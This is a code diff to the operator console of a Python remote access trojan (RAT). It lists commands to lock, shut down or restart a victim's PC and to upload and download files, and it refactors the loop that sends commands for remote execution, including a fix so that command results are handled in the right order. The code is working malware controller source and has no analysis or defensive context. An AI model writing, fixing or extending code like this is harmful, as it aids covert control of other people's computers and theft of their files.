@@ -26,13 +26,13 @@ commands = [
     ["lock", "Puts the client user back to the login screen"],
     ["shutdown", "Shutsdown the client users PC, will close connection"],
     ["restart", "Restarts the client users PC"],
-    ["ratHelp", "Shows this list again"],
+    ["ratHelp", "Displays this list"]
 ]
 
 
-def helpCommands():
+def helpCommand():
     total = 0
-    print("Commands: ")
+    print("\nCommands: \n")
     # Simple loop to send a description of all commands
     for x in commands:
         print(f"[{total}] {commands[total][0]} - {commands[total][1]}")
@@ -53,7 +53,7 @@ class Server:
         print(colorama.Fore.GREEN)
         print("[+] Connection received from " + str(address))
         print(colorama.Style.RESET_ALL)
-        helpCommands()
+        helpCommand()
 
     def dataReceive(self):
         jsonData = b""
@@ -86,20 +86,17 @@ class Server:
 
     def run(self):
         while True:
-            header = self.dataReceive()
-            command = input(
-                f"{colorama.Fore.LIGHTBLUE_EX}{header}{colorama.Style.RESET_ALL}"
-            )
+            command = input(">>> ")
             command = command.split(" ", 1)
             try:
                 if command[0] == "upload":
                     fileContent = self.readFile(command[1]).decode()
                     command.append(fileContent)
-                if command[0] == "ratHelp":
-                    helpCommands()
+                result = self.executeRemotely(command)
                 if command[0] == "download" and "[-] Error" not in result:
                     result = self.writeFile(command[1], result)
-                result = self.executeRemotely(command)
+                elif command[0] == "ratHelp":
+                    helpCommand()
             except Exception:
                 result = "[-] Error running command, check the syntax of the command."
             print(result)
